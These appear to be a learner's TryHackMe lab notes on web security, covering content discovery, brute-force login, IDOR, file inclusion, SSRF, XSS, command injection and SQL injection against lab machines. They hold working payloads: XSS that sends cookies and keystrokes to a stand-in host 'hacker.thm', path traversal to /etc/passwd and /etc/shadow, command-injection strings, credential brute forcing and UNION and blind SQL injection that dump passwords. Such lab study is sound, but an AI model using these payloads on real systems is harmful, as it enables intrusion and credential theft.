# Intro to Web Security

## Walking An Application

[link](https://tryhackme.com/room/walkinganapplication)

- Subdomains to check out: 
    * '/news', 'news/article?id=1', '/contact', '/customers', 'customers/login'
    * 'contact/', 'customers/signup', '/customers/reset', 'customers/logout'
- Finding vulnerabilities in view-source
    * (1) comments
    * (2) links
    * (3) check js root dir (/assets/)
    * (4) check framework vulnerabilities by identifiying template: [template](https://static-labs.tryhackme.cloud/sites/thm-web-framework/)
    * (5) bypassing paywall by locating paywall div and changing `display:block` to  `display: none`
    * (6) check if there is any hidden textbox and view them by inserting breakpoints into 'Debugger'
    * (7) Using 'Network' to send request and read its header to find the flag

```
>>> 
(1) url: http://10.10.246.238//new-home-beta; FLAG: THM{HTML_COMMENTS_ARE_DANGEROUS}
(2) url: view-source:http://10.10.246.238/secret-page; FLAG: THM{NOT_A_SECRET_ANYMORE}
(3) url: view-source:http://10.10.246.238/assets/flag.txt; FLAG: THM{INVALID_DIRECTORY_PERMISSIONS} (check directory in js)
(4) url: 10.10.246.238/tmp.zip; FLAG: THM{KEEP_YOUR_SOFTWARE_UPDATED}
(5) url: http://10.10.246.238/news/article?id=3; FLAG: THM{NOT_SO_HIDDEN}
(6) FLAG: THM{CATCH_ME_IF_YOU_CAN}
(7) url: FLAG: THM{HEADER_FLAG}; FLAG: THM{GOT_AJAX_FLAG}


url: https://static-labs.tryhackme.cloud/sites/thm-web-framework/v2; FLAG: THM Static Labs
```

## Content Discovery

[link](https://tryhackme.com/room/contentdiscovery)

There are 3 types of contents discovery: (1) manually (2) automated (3) OSINT

- Manually
    * (1) robots.txt
    * (2) Favicon: using `md5sum` to find OWASP favicon database (its framwork) [OWASP favicon database](https://wiki.owasp.org/index.php/OWASP_favicon_database)
    * (3) sitemap
    * (4) HTTP headers: `curl <url> -v`
    * (5) framework stack: once we have identified the framework stack, we can check its vulnerabilities
- (6) Automated
    * `ffuf`
    * `dirb`
    * `gobuster`
    * [SecList](https://github.com/danielmiessler/SecLists)
- OSINT
    * Google Hacking / Dorking: google search with `site:<url>`, `inurl:admin`, `filetype:pdf`, `intitle:admin`
    * Finding technologies used (frameworks, content management systems (CMS)) [Wappalyzer](https://www.wappalyzer.com/)
    * [Wayback Machine](https://archive.org/web/)
    * Github to see pushed password
    * S3 Buckets: save file in cloud using HTTP and HTTPS; sometimes files are set public even though they shouldn't => automation: `{name}-assets,{name}-www, {name}-public, {name}-private`; 's3.amazonaws.com'
```

-------------- MANUALLY ---------------------

(1) url: http://10.10.171.185/robots.txt

(2) url: https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico
>>> curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
f276b19aabcb4ae8cda4d22625c6735f => correspond to 'cgiirc'
(3) url: http://10.10.171.185/sitemap.xml; s3cr3t-area

(4) 
>>> curl 10.10.171.185 -v; FLAG: THM{HEADER_FLAG}

(5) url: http://10.10.246.238/thm-framework-login; username: admin; password: admin; FLAG: THM{CHANGE_DEFAULT_CREDENTIALS}

-------------- OSINT ---------------------


-------------- AUTOMATED ---------------------

(6) 
>>> grep "^mo" /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt > tmp.txt
>>> dirb http://10.10.171.185/ tmp.txt
 http://10.10.171.185/monthly (CODE:200|SIZE:28)

(7)
>>> grep "log" /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt > tmp1.txt
>>> dirb http://10.10.171.185/ tmp1.txt
 http://10.10.171.185/development.log (CODE:200|SIZE:27)
```

## Subdomain Enumeration

There are three types of subdomains enumerations: (1) brute force (2) OSINT and (3) virtual host

- Brute Force
    * DNS Bruteforce: `dnsrecon -t brt -d acmeitsupport.thm`
- OSINT
    * SSL/TLS Certificates [crt](https://crt.sh/) [ctsearch](https://ui.ctsearch.entrust.com/ui/ctsearchui)
    * Search Engines
    * [Sublist3r](https://github.com/aboul3la/Sublist3r): subdomains enumerations
- Virtual Host
    * 

```
>>> ./ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.167.47 -fs 2395
api                     [Status: 200, Size: 31, Words: 4, Lines: 1, Duration: 106ms]
delta                   [Status: 200, Size: 51, Words: 7, Lines: 1, Duration: 99ms]
yellow                  [Status: 200, Size: 56, Words: 8, Lines: 1, Duration: 99ms]
```

## Authentication Bypass

**Brute Forcing**

1) create a list of username that already exists by going to signup page and fetching the username that have already been taken
2) Once we have our list of username, try to brute force using common password

```
# (1) Creating a list of username that already exists

>>> ./ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.50.45/customers/signup -mr "username already exists"
admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 219ms]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 106ms]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 107ms]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 106ms]

# (2) check credentials with status code other than 200

>>> ./ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.50.45/customers/login -fc 200

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 124ms]
   * W1: steve
   * W2: thunder
```

**Exploiting Logic Flaws**

We can redirect email to our own


username: 'robert'
email: 'robert@acmeitsupport.thm'



```
>>> curl 'http://10.10.250.243/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
>>> curl 'http://10.10.250.243/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
>>> curl 'http://10.10.250.243/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
>>> curl 'http://10.10.250.243/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=yuki@customer.acmeitsupport.thm'

url: 'http://10.10.250.243/customers/tickets'
```

**Cookie Tempering**

- Type of Hashing used for cookie: [crackstation](https://crackstation.net/)
    * `md5`: [link](https://md5.gromweb.com/?md5=3b2a1053e3270077456a79192070aa78)
    * `sha-256`
    * `sha-512`
    * `sha1`
- Encoding Types
    * `base32`, `base64`


```
>>> curl http://10.10.250.243/cookie-test -H "Cookie: logged_in=true; admin=true"
 THM{COOKIE_TAMPERING}
>>> echo "VEhNe0JBU0U2NF9FTkNPRElOR30" | base64 -d
THM{BASE64_ENCODING}
>>> echo '{"id":1,"admin":true}' | base64
eyJpZCI6MSwiYWRtaW4iOnRydWV9Cg==
```


## IDOR (Insecure Direct Object Reference)

IDOR vulnerabilities occurs when the site doesn't verify that the user requesting
the data has the rights to read the data. Usually, IDOR vulnerabilities occurs when:
- base64 encode/decode ids
- md5 hash functions
- swappings ids

Always check network to see if there is database to be found

- Difference between encoded and hashed IDs

[base64encode](https://www.base64encode.org/)
[base64decode](https://www.base64decode.org/)

url: 'https://10-10-125-143.p.thmlabs.com/api/v1/customer?id=1'

## File Inclusion

Types of Files inclusion vulnerabilities:
- Local File Intrusion (LFI)
- Remote File Intrusion (RFI)
- Directory Traversal: `http://webapp.thm/get.php?file=../../../../etc/passwd`, 'boot.ini', 'win.ini', 'etc/shadow', 'proc/version', 'var/mail/root'; see `file_get_contents()`

Vulnerable PHP functions:
- `include`, `require`, `include_once`, `require_once`


```
#### Lab 1

>>> /usr/passwd
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false 


```

## Server-Side Request Forgery (SSRF)

- Types of SSRF:
    - Normal
    - Blind: no information returned to attacker

- How to spot SSRF: its url has hidden field in a form `server=https...`, `api`, `/forms/contact` => [request.bin](requestbin.com)
- SSRF Defense:
    * Deny List
    * Allow List
    * Open Redirect

Writeup: when choosing a new avatar, we remark that updating the avatar give us
a base64 encoded string. We want to use SSRF to gain access


```
url: https://website.thm/item/2?server=server.website.thm/flag?id=9&x; FLAG: THM{SSRF_MASTER}

>>> change value to 
<div class="avatar-image" style="background-image: url('/assets/avatars/6.png')"></div>
<input type="radio" name="avatar" value="assets/avatars/6.png">

<input type="radio" name="avatar" value="x/../private">

which gives

<div class="avatar-image" style="background-image: url(data:image/png;base64,VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ==)"></div>

>>> echo "VEhNe1lPVV9XT1JLRURfT1VUX1RIRV9TU1JGfQ" | base64 -d 
THM{YOU_WORKED_OUT_THE_SSRF}
```

## Cross-site scripting (XSS)

Types of XSS:
- reflected xss
    * testing reflected XSS in (1) url file path (2) query string
- stored xss: steal user's cookie
    * comments, website listing
- DOM XSS: Document Object Model
    * unsafe function: `window.location.x`, `eval()`

- Executing Payload on target computer
    * POC: `<script>alert('XSS');</script>`
    * stealing a cookie: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
    * key logger: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
    * logic: `<script>user.changeEmail('attacker@hacker.thm');</script>`
- Blind XSS: http request [xss hunter](https://xsshunter.com/#/)


**Payloads**

```
# Level 1: adding alert

<h2>Hello, test</h2>
>>> <script>alert('THM');</script>
<h2>Hello, <script>alert('THM');</script>

# Level 2: making input value empty

<h2>Hello, <input value="test"></h2>
>>> "><script>alert('THM');</script>
<h2>Hello, <input value=""><script>alert('THM');</script></h2>

# Level 3: Closing text area before calling payload

<h2>Hello, <textarea>test</textarea></h2>
>>> </textarea><script>alert('THM');</script><textarea>
<h2>Hello, <textarea></textarea><script>alert('THM');</script><textarea></textarea></h2>

# Level 4: closing '' and executing payload

<h2>Hello, <span class="name"></span></h2>
    <script>
        document.getElementsByClassName('name')[0].innerHTML='test';
    </script>
>>> ';alert('THM');//
document.getElementsByClassName('name')[0].innerHTML='';alert('THM');//';

# Level 5: script is getting remove from payload

<h2>Hello, test</h2>
 <h2>Hello, <>alert('THM');</></h2>
>>> <sscriptcript>alert('THM');</sscriptcript>

# Level 6: taking advantage of 'onload' attribute for src

<div class="text-center">
    <h2>Your Picture</h2>
    <img src="/images/cat.jpg">
</div>

>>> <script>alert('THM');</script>
<img src="scriptalert('THM');/script">

>>> /images/cat.jpg" onload="alert('THM');
```

**Payload in Action**

```
>>> temp
 <div><label>Ticket Created:</label> 03/05/2023 14:33</div>
                    <div><label>Ticket Contents:</label></div>
                    <div><textarea class="form-control">temp</textarea></div>

>>> </textarea><script>alert('THM');</script><textarea>

# fetching the cookie

>>> nc -nlvp 9001

```


## Command Injections

- Blind vs verbose command injections
- Populating system command with `;`, `&`, `&&`
- Linux Payloads: whoami, ls, **ping**, sleep, nc
- Windows Payloads: whoami, dir, ping, **timeout**
- PHP vulnerable functions: 'exec', 'passthru', 'system'
- How to prevent command injections:
    * Input sanitisation: remove character '>&/'
    * we can still perform command injections by injections payload as hex: '\x2f\x65..'

[command injections payload list](https://github.com/payloadbox/command-injection-payload-list)

```
>>> ;id;
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
>>> ;whoami;
www-data
>>>  ;cat /home/tryhackme/flag.txt;
THM{COMMAND_INJECTION_COMPLETE} 
```


## SQL Injection

- Types of database management system (DBMS): relational (SQL) vs non-relational (MongoDB, Cassandra, ElasticSearch)
- Types of SQL Injections: 
    * Error-Based:
    * Union-Based:
- To find if a site has a SQL Injection vulnerabilities, try to add `'` to the end of the url to see if it show a database error
- Performing SQL INjection:
    1. establish number of columns in table with 'UNION SELECT'
    2. Find the database -> table_name -> columns
    3. write query
- Preventing SQL Injections:
    * Prepared Statements
    * Input validation and restrict list
    * Escaping User Input: prepending '\' to special characters


```
# Level 1 - Error-Based SQL Injection

>>> https://website.thm/article?id=1'
>>> https://website.thm/article?id=1 UNION SELECT 1,2,3
>>> https://website.thm/article?id=0 UNION SELECT 1,2,database()
> sqli_one
>>> https://website.thm/article?id=0 UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
> article,staff_users
>>> https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns where table_name = 'staff_users'
> id,username,password
>>> https://website.thm/article?id=0 union select 1,2,group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users
admin:p4ssword
martin:pa$$word
jim:work123
THM{SQL_INJECTION_3840}

# Level 2 - Authentication bypass

>>> password: ' OR 1=1;--
>>> select * from users where username='' and password='' OR 1=1;
THM{SQL_INJECTION_9581}

# Level 3 - Boolean Based

>>> https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;--

Finding the name of the database by 'brute forcing' all character one by one (we continue if take=true)
>>> https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
{"taken":true}
>>> https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 'sqli_three';--

Repeating this process
> admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

>>> https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password='3845';-- [TRUE]
THM{SQL_INJECTION_1093}


# Level 4 - Time Based

If there is no [OK], it means that its good
>>> https://website.thm/analytics?referrer=admin123' union select sleep(5), 2 where database() like 'u%';-- [OK]

THM{SQL_INJECTION_MASTER}
```



